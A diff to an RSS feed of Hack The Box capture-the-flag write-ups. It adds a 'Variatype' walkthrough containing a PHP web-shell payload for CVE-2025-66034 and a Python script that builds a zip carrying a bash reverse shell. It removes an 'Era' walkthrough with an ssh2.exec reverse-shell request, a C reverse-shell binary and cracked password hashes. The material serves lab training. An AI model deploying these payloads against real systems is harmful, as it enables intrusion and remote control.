@@ -4,7 +4,7 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Sat, 25 Apr 2026 14:22:49 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 30 Jun 2026 21:17:21 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
         <item>
@@ -135,6 +135,197 @@ I used <a title="https://api.goauthentik.io/reference/core-users-list/" href="ht
 <p><img src="/_resources/9c7b192021394998b079d7a5b5cb898e.png" /></p>
 <p>We can finaly get the root flag.<br />
 <img src="/_resources/b50027c19c0345b4831ee574b61f8920.png" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Linux - Medium - Variatype]]></title>
+            <guid>00871467a5354f319b1641800a26a45e</guid>
+            <pubDate>Thu, 19 Mar 2026 09:19:28 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p><img src="/_resources/56cc49ca378b49af8d7dd5d6ceb6c517.png" /></p>
+<p>There is font generation option that is clearly our target, as it allows external uploads.<br />
+<img src="/_resources/493e78bbd0d64290bd49477358961da5.png" /></p>
+<p>Doing further recon, we can find admin portal under <code>http://portal.variatype.htb/</code>.<br />
+<img src="/_resources/64e3b49c0a0443dda687e6286f1f3ebe.png" /></p>
+<p>Looking with dirsearch we can fint exposed git with credentials, <code>gitbot:G1tB0t_Acc3ss_2025!</code></p>
+<h1 id="cve-2025-66034">CVE-2025-66034</h1>
+<p>We can then craft three malicious files according to CVE-2025-66034. Files at the bottom of the writeup.<br />
+<img src="/_resources/676433f3b36247c29f28d9efc7f477b3.png" /></p>
+<p>We can then check that it got accepted under admin admin.<br />
+<img src="/_resources/6f2317b6bde2426d8756e9301fa902b5.png" /></p>
+<p>Shell can be accessed with <code>http://portal.variatype.htb/files/shell.php?cmd=ls</code>.<br />
+I used penelope to generate the payload and gain the revshell.<br />
+<img src="/_resources/08b876b59558498e87b178d8f324b88a.png" /></p>
+<p>We gain shell as www-data.<br />
+<img src="/_resources/4eed804f81c6422ca0a3a31c78dfa7f8.png" /></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>After entering the machine we can do classic htb box recon. <code>sudo -l</code>, <code>ps -aux</code>, <code>ss -tulpn</code> gives nothing. Checking <code>/opt</code> gives us a script <code>process_client_submissions.bak</code> that is being run on a regular basis by user steve. Attached it also at the bottom. Working with gemini we can create a script giving us a zip file, that will give us a reverse shell. Script also attached below.</p>
+<p>Upload the shell into folder with uploads.<br />
+<img src="/_resources/bbb94e4970404845ba23e43c22f971df.png" /><br />
+<img src="/_resources/64bd391ddae14629829c4195ca76cf2e.png" /><br />
+<img src="/_resources/4da160e230b14f928a77093833d4584b.png" /></p>
+<h1 id="priv-esc-2">Priv esc</h1>
+<p>Now checking <code>sudo -l</code> allows us some python script, which is obviously our target.<br />
+<img src="/_resources/c56e26cc47414439a3fa2f59c7a68063.png" /></p>
+<p>TLDR, we can create our own sudoers file and then import it one the machine.<br />
+<img src="/_resources/c299e023478d4b39a211a14fb7772466.png" /><br />
+<img src="/_resources/ceb4609207434e25bf9e9f6d0f684996.png" /></p>
+<hr />
+<p>.designspace</p>
+<div><pre class="hljs"><code><span class="language-php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">'1.0'</span> encoding=<span class="hljs-string">'UTF-8'</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml">
+<span class="hljs-tag">&lt;<span class="hljs-name">designspace</span> <span class="hljs-attr">format</span>=<span class="hljs-string">"5.0"</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">axes</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">axis</span> <span class="hljs-attr">tag</span>=<span class="hljs-string">"wght"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Weight"</span> <span class="hljs-attr">minimum</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">maximum</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">default</span>=<span class="hljs-string">"400"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">labelname</span> <span class="hljs-attr">xml:lang</span>=<span class="hljs-string">"en"</span>&gt;</span>&lt;![CDATA[</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">labelname</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">axis</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">axes</span>&gt;</span>
+  
+  <span class="hljs-tag">&lt;<span class="hljs-name">sources</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"source-regular.ttf"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Regular"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dimension</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Weight"</span> <span class="hljs-attr">xvalue</span>=<span class="hljs-string">"400"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"source-light.ttf"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Light"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dimension</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Weight"</span> <span class="hljs-attr">xvalue</span>=<span class="hljs-string">"100"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">sources</span>&gt;</span>
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">variable-fonts</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">variable-font</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"MaliciousFont"</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">"shell.php"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">axis-subsets</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">axis-subset</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Weight"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">axis-subsets</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">variable-font</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">variable-fonts</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">designspace</span>&gt;</span></span></code></pre></div>
+<p>filegenerator.py</p>
+<div><pre class="hljs"><code>import os
+
+from fontTools.fontBuilder import FontBuilder
+from fontTools.pens.ttGlyphPen import TTGlyphPen
+
+def create<span class="hljs-constructor">_source_font(<span class="hljs-params">filename</span>, <span class="hljs-params">weight</span>=400)</span>:
+    fb = <span class="hljs-constructor">FontBuilder(<span class="hljs-params">unitsPerEm</span>=1000, <span class="hljs-params">isTTF</span>=True)</span>
+    fb.setup<span class="hljs-constructor">GlyphOrder([<span class="hljs-string">".notdef"</span>])</span>
+    fb.setup<span class="hljs-constructor">CharacterMap({})</span>
+    
+    pen = <span class="hljs-constructor">TTGlyphPen(None)</span>
+    pen.move<span class="hljs-constructor">To((0, 0)</span>)
+    pen.line<span class="hljs-constructor">To((500, 0)</span>)
+    pen.line<span class="hljs-constructor">To((500, 500)</span>)
+    pen.line<span class="hljs-constructor">To((0, 500)</span>)
+    pen.close<span class="hljs-constructor">Path()</span>
+    
+    fb.setup<span class="hljs-constructor">Glyf({<span class="hljs-string">".notdef"</span>: <span class="hljs-params">pen</span>.<span class="hljs-params">glyph</span>()</span>})
+    fb.setup<span class="hljs-constructor">HorizontalMetrics({<span class="hljs-string">".notdef"</span>: (500, 0)</span>})
+    fb.setup<span class="hljs-constructor">HorizontalHeader(<span class="hljs-params">ascent</span>=800, <span class="hljs-params">descent</span>=-200)</span>
+    fb.setup<span class="hljs-constructor">OS2(<span class="hljs-params">usWeightClass</span>=<span class="hljs-params">weight</span>)</span>
+    fb.setup<span class="hljs-constructor">Post()</span>
+    fb.setup<span class="hljs-constructor">NameTable({<span class="hljs-string">"familyName"</span>: <span class="hljs-string">"Test"</span>, <span class="hljs-string">"styleName"</span>: <span class="hljs-params">f</span><span class="hljs-string">"Weight{weight}"</span>})</span>
+    fb.save(filename)
+
+<span class="hljs-keyword">if</span> __name__<span class="hljs-operator"> == </span>'__main__':
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    create<span class="hljs-constructor">_source_font(<span class="hljs-string">"source-light.ttf"</span>, <span class="hljs-params">weight</span>=100)</span>
+    create<span class="hljs-constructor">_source_font(<span class="hljs-string">"source-regular.ttf"</span>, <span class="hljs-params">weight</span>=400)</span></code></pre></div>
+<p>process_client_submissions.bak</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># Variatype Font Processing Pipeline</span>
+<span class="hljs-comment"># Author: Steve Rodriguez &lt;steve@variatype.htb&gt;</span>
+<span class="hljs-comment"># Only accepts filenames with letters, digits, dots, hyphens, and underscores.</span>
+<span class="hljs-comment">#</span>
+
+<span class="hljs-built_in">set</span> -euo pipefail
+
+UPLOAD_DIR=<span class="hljs-string">"/var/www/portal.variatype.htb/public/files"</span>
+PROCESSED_DIR=<span class="hljs-string">"/home/steve/processed_fonts"</span>
+QUARANTINE_DIR=<span class="hljs-string">"/home/steve/quarantine"</span>
+LOG_FILE=<span class="hljs-string">"/home/steve/logs/font_pipeline.log"</span>
+
+mkdir -p <span class="hljs-string">"<span class="hljs-variable">$PROCESSED_DIR</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$QUARANTINE_DIR</span>"</span> <span class="hljs-string">"<span class="hljs-subst">$(dirname <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>)</span>"</span>
+
+<span class="hljs-function"><span class="hljs-title">log</span></span>() {
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[<span class="hljs-subst">$(date --iso-8601=seconds)</span>] $*"</span> &gt;&gt; <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
+}
+
+<span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$UPLOAD_DIR</span>"</span> || { <span class="hljs-built_in">log</span> <span class="hljs-string">"ERROR: Failed to enter upload directory"</span>; <span class="hljs-built_in">exit</span> 1; }
+
+<span class="hljs-built_in">shopt</span> -s nullglob
+
+EXTENSIONS=(
+    <span class="hljs-string">"*.ttf"</span> <span class="hljs-string">"*.otf"</span> <span class="hljs-string">"*.woff"</span> <span class="hljs-string">"*.woff2"</span>
+    <span class="hljs-string">"*.zip"</span> <span class="hljs-string">"*.tar"</span> <span class="hljs-string">"*.tar.gz"</span>
+    <span class="hljs-string">"*.sfd"</span>
+)
+
+SAFE_NAME_REGEX=<span class="hljs-string">'^[a-zA-Z0-9._-]+$'</span>
+
+found_any=0
+<span class="hljs-keyword">for</span> ext <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${EXTENSIONS[@]}</span>"</span>; <span class="hljs-keyword">do</span>
+    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-variable">$ext</span>; <span class="hljs-keyword">do</span>
+        found_any=1
+        [[ -f <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ]] || <span class="hljs-built_in">continue</span>
+        [[ -s <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ]] || { <span class="hljs-built_in">log</span> <span class="hljs-string">"SKIP (empty): <span class="hljs-variable">$file</span>"</span>; <span class="hljs-built_in">continue</span>; }
+
+        <span class="hljs-comment"># Enforce strict naming policy</span>
+        <span class="hljs-keyword">if</span> [[ ! <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> =~ <span class="hljs-variable">$SAFE_NAME_REGEX</span> ]]; <span class="hljs-keyword">then</span>
+            <span class="hljs-built_in">log</span> <span class="hljs-string">"QUARANTINE: Filename contains invalid characters: <span class="hljs-variable">$file</span>"</span>
+            mv <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$QUARANTINE_DIR</span>/"</span> 2&gt;/dev/null || <span class="hljs-literal">true</span>
+            <span class="hljs-built_in">continue</span>
+        <span class="hljs-keyword">fi</span>
+
+        <span class="hljs-built_in">log</span> <span class="hljs-string">"Processing submission: <span class="hljs-variable">$file</span>"</span>
+
+        <span class="hljs-keyword">if</span> timeout 30 /usr/<span class="hljs-built_in">local</span>/src/fontforge/build/bin/fontforge -lang=py -c <span class="hljs-string">"
+import fontforge
+import sys
+try:
+    font = fontforge.open('<span class="hljs-variable">$file</span>')
+    family = getattr(font, 'familyname', 'Unknown')
+    style = getattr(font, 'fontname', 'Default')
+    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
+    font.close()
+except Exception as e:
+    print(f'ERROR: Failed to process <span class="hljs-variable">$file</span>: {e}', file=sys.stderr)
+    sys.exit(1)
+"</span>; <span class="hljs-keyword">then</span>
+            <span class="hljs-built_in">log</span> <span class="hljs-string">"SUCCESS: Validated <span class="hljs-variable">$file</span>"</span>
+        <span class="hljs-keyword">else</span>
+            <span class="hljs-built_in">log</span> <span class="hljs-string">"WARNING: FontForge reported issues with <span class="hljs-variable">$file</span>"</span>
+        <span class="hljs-keyword">fi</span>
+
+        mv <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$PROCESSED_DIR</span>/"</span> 2&gt;/dev/null || <span class="hljs-built_in">log</span> <span class="hljs-string">"WARNING: Could not move <span class="hljs-variable">$file</span>"</span>
+    <span class="hljs-keyword">done</span>
+<span class="hljs-keyword">done</span>
+
+<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$found_any</span> -eq 0 ]]; <span class="hljs-keyword">then</span>
+    <span class="hljs-built_in">log</span> <span class="hljs-string">"No eligible submissions found."</span>
+<span class="hljs-keyword">fi</span></code></pre></div>
+<p>shell.py</p>
+<div><pre class="hljs"><code>└─$ cat shell.py         
+<span class="hljs-keyword">import</span> zipfile
+
+# :<span class="hljs-built_in">warning</span>: CHANGE THESE <span class="hljs-keyword">TO</span> YOUR HTB VPN IP <span class="hljs-keyword">AND</span> YOUR LISTENER PORT
+LHOST = "10.10.16.50"
+LPORT = "4445"
+
+# The standard bash <span class="hljs-keyword">reverse</span> shell, wrapped <span class="hljs-keyword">in</span> $() <span class="hljs-keyword">to</span> <span class="hljs-keyword">trigger</span> command execution 
+# <span class="hljs-keyword">when</span> FontForge unsafely parses the archiv<span class="hljs-string">e's Table of Contents.
+payload = f"$(bash -c '</span>bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">')"
+
+# Create the malicious zip file
+with zipfile.ZipFile("exploit.zip", "w") as zf:
+    # zf.writestr(archive_name, file_data)
+    # The '</span>archive_nam<span class="hljs-string">e' is what triggers the vulnerability.
+    zf.writestr(payload, "dummy data")
+
+print(f"[*] exploit.zip created!")
+print(f"[*] Payload: {payload}")
+print(f"[*] Don'</span>t forget <span class="hljs-keyword">to</span> <span class="hljs-keyword">start</span> your listener: nc -lvnp {LPORT}") </code></pre></div>
 ]]></content:encoded>
         </item>
         <item>
@@ -1335,107 +1526,6 @@ Matching Defaults entries <span class="hljs-keyword">for</span> jacob on outboun
 User jacob may run the following commands on outbound:
     (ALL : ALL) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/below *, !/u</span>sr<span class="hljs-regexp">/bin/</span>below --config*, !<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/below --debug*, !/u</span>sr<span class="hljs-regexp">/bin/</span>below -d*</code></pre></div>
 <p><a title="https://raw.githubusercontent.com/Thekin-ctrl/CVE-2025-27591-Below/refs/heads/main/Exploit.py" href="https://raw.githubusercontent.com/Thekin-ctrl/CVE-2025-27591-Below/refs/heads/main/Exploit.py">https://raw.githubusercontent.com/Thekin-ctrl/CVE-2025-27591-Below/refs/heads/main/Exploit.py</a></p>
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Linux - Medium - Era]]></title>
-            <guid>33bfffb0f7614715b41bfbf1e03b2779</guid>
-            <pubDate>Thu, 31 Jul 2025 15:48:26 GMT</pubDate>
-            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
-<p><img src="/_resources/7a25f15c7dde4b9eaff6764fe2d78f17.png" /></p>
-<p><img src="/_resources/d9303eef1a7f4ec8ab2381143174a7a1.png" /></p>
-<div><pre class="hljs"><code><span class="hljs-section">└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://era.htb  --append-domain -t 150
-===============================================================</span>
-Gobuster v3.6
-<span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================</span>
-[+] Url:             http://era.htb
-[+] Method:          GET
-[+] Threads:         150
-[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
-[+] User Agent:      gobuster/3.6
-[+] Timeout:         10s
-[+] Append Domain:   true
-===============================================================
-Starting gobuster in VHOST enumeration mode
-===============================================================
-Found: file.era.htb Status: 200 [Size: 6765]</code></pre></div>
-<p><img src="/_resources/a6cdbaefe9284a50b6558154c32583be.png" /></p>
-<p><img src="/_resources/261558baaada40c2a43dd8d042a67e85.png" /></p>
-<h1 id="file">file</h1>
-<p>When looking at the dirbuster, we can find register.php, which is not visible on the main site. We then get access to the management panel.</p>
-<p><img src="/_resources/a9d986aaf4d64d7c813ef5459b6bf50c.png" /></p>
-<p>In it, we can upload files. Doing so, gives us a download link with possible idor.</p>
-<p><img src="/_resources/28a75edb17ad410e803f1032f01f2551.png" /></p>
-<p>We can check random number and see that authentication for that user is not required.</p>
-<p><img src="/_resources/510ccee877284e99b30bf992c17a89be.png" /></p>
-<p>We can enumerate it using ffuf.</p>
-<div><pre class="hljs"><code><span class="hljs-string">ffuf</span> <span class="hljs-string">-w</span> <span class="hljs-string">numbers.txt:FUZZ</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://file.era.htb/download.php?id=FUZZ</span> <span class="hljs-string">-b</span> <span class="hljs-string">"PHPSESSID=0gdg6cbtkrrcqb72sr386l3005"</span> <span class="hljs-string">-mc</span> <span class="hljs-number">200</span> <span class="hljs-string">-fr</span> <span class="hljs-string">"Not Found"</span>
-
-<span class="hljs-number">54</span>                      [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">6378</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">67ms</span>]
-<span class="hljs-number">150</span>                     [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">6366</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">38ms</span>]</code></pre></div>
-<p>This gives us two files, <code>signing.zip</code> and <code>site-backup-30-08-24.zip</code>. After extraction we get <code>filedb.sqlite</code>.</p>
-<p><img src="/_resources/80259d4cfcfd43459ced6330414cfb83.png" /></p>
-<p>We can crack them with <code>hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt</code> and get</p>
-<div><pre class="hljs"><code><span class="hljs-variable">$2y</span><span class="hljs-variable">$10</span><span class="hljs-variable">$S9EOSDqF1RzNUvyVj7OtJ</span>.<span class="hljs-symbol">mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:</span>america - eric
-<span class="hljs-variable">$2b</span><span class="hljs-variable">$12</span><span class="hljs-variable">$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2</span>.<span class="hljs-symbol">:mustang</span> - yuri</code></pre></div>
-<p>Using these findings, we can log in as yuri and reset admin_ef01cab31aa password using “Update Security Questions” feature.</p>
-<p><img src="/_resources/1f973860ed114f008b83dd3ca0fba711.png" /></p>
-<p><img src="/_resources/0c3b46c1d72a442cb67b68d062bdef22.png" /></p>
-<p><img src="/_resources/91b1590b4da54356a4e299272cb49511.png" /></p>
-<p>Looking back at the source code, we can find in download.php interesting comment.</p>
-<div><pre class="hljs"><code>    <span class="hljs-comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span>
-    } <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'show'</span>] === <span class="hljs-string">"true"</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'erauser'</span>] === <span class="hljs-number">1</span>) {
-    		<span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'format'</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'format'</span>] : <span class="hljs-string">''</span>;
-    		<span class="hljs-variable">$file</span> = <span class="hljs-variable">$fetched</span>[<span class="hljs-number">0</span>];
-
-        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$format</span>, <span class="hljs-string">'://'</span>) !== <span class="hljs-literal">false</span>) {
-        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-variable">$format</span>;
-        		header(<span class="hljs-string">'Content-Type: application/octet-stream'</span>);
-    		} <span class="hljs-keyword">else</span> {
-        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-string">''</span>;
-        		header(<span class="hljs-string">'Content-Type: text/html'</span>);
-    		}
-
-    		<span class="hljs-keyword">try</span> {
-        		<span class="hljs-variable">$file_content</span> = fopen(<span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>, <span class="hljs-string">'r'</span>);
-            <span class="hljs-variable">$full_path</span> = <span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>;
-            <span class="hljs-comment">// Debug Output</span>
-            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Opening: "</span> . <span class="hljs-variable">$full_path</span> . <span class="hljs-string">"\n"</span>;
-        		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_content</span>;
-    		} <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
-        		<span class="hljs-keyword">echo</span> <span class="hljs-string">"Error reading file: "</span> . <span class="hljs-variable">$e</span>-&gt;getMessage();
-    		}</code></pre></div>
-<p>We can abuse it using ss2exec wrapper.</p>
-<div><pre class="hljs"><code><span class="hljs-attribute">GET</span> /download.php?id=<span class="hljs-number">54</span>&amp;show=true&amp;format=ssh2.exec%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>fyuri%<span class="hljs-number">3</span>amustang%<span class="hljs-number">40127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">2</span>fbash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>fdev%<span class="hljs-number">2</span>ftcp%<span class="hljs-number">2</span>f<span class="hljs-number">10.10.16.29</span>%<span class="hljs-number">2</span>f4444%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">261</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>a</code></pre></div>
-<p><img src="/_resources/7a6a93cdd917449f985eee4b72a4dd77.png" /></p>
-<p>We can then sign in as eric and get the user flag.</p>
-<p>Shell stabilisationfor Qol.</p>
-<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
-stty raw -<span class="hljs-built_in">echo</span> 
-^Z
-<span class="hljs-built_in">fg</span></code></pre></div>
-<h1 id="priv-esc">Priv esc</h1>
-<p>ps aux gets us</p>
-<div><pre class="hljs"><code><span class="hljs-attribute">root</span>       <span class="hljs-number">44149</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">2892</span>   <span class="hljs-number">968</span> ?        Ss   <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /bin/sh -c bash -c '/root/initiate_monitoring.sh' &gt;&gt; /opt/AV/periodic-checks/status.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>
-<span class="hljs-attribute">root</span>       <span class="hljs-number">44150</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">4784</span>  <span class="hljs-number">3292</span> ?        S    <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /bin/bash /root/initiate_monitoring.sh
-<span class="hljs-attribute">root</span>       <span class="hljs-number">44160</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">2776</span>  <span class="hljs-number">1024</span> ?        S    <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /opt/AV/periodic-checks/monitor</code></pre></div>
-<p>We can check that devs can write to this file - and we are devs.</p>
-<div><pre class="hljs"><code>eric@era:<span class="hljs-regexp">/tmp$ ls -al /</span>opt<span class="hljs-regexp">/AV/</span>periodic-checks/monitor
--rwxrw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">16544</span> Aug  <span class="hljs-number">1</span> <span class="hljs-number">11</span>:<span class="hljs-number">57</span> <span class="hljs-regexp">/opt/</span>AV<span class="hljs-regexp">/periodic-checks/m</span>onitor
-eric@era:/tmp$ id
-uid=<span class="hljs-number">1000</span>(eric) gid=<span class="hljs-number">1000</span>(eric) groups=<span class="hljs-number">1000</span>(eric),<span class="hljs-number">1001</span>(devs)
-eric@era:<span class="hljs-regexp">/tmp$ file /</span>opt<span class="hljs-regexp">/AV/</span>periodic-checks/monitor
-<span class="hljs-regexp">/opt/</span>AV<span class="hljs-regexp">/periodic-checks/m</span>onitor: ELF <span class="hljs-number">64</span>-bit LSB pie executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, BuildID[sha1]=<span class="hljs-number">45</span>a4bb1db5df48dcc085cc062103da3761dd8eaf, <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>, not stripped</code></pre></div>
-<p>All that is left to create a simple revshell, sign it and wait for root.</p>
-<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
-<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
-    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>); <span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);
-    <span class="hljs-built_in">execl</span>(<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/10.10.16.29/2137 0&gt;&amp;1"</span>, <span class="hljs-literal">NULL</span>);
-    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
-}</code></pre></div>
-<p>x86_64-linux-gnu-gcc -o monitor reverse.c -static<br />
-./elf-sign sha256 key.pem key.pem monitor</p>
 ]]></content:encoded>
         </item>
     </channel>
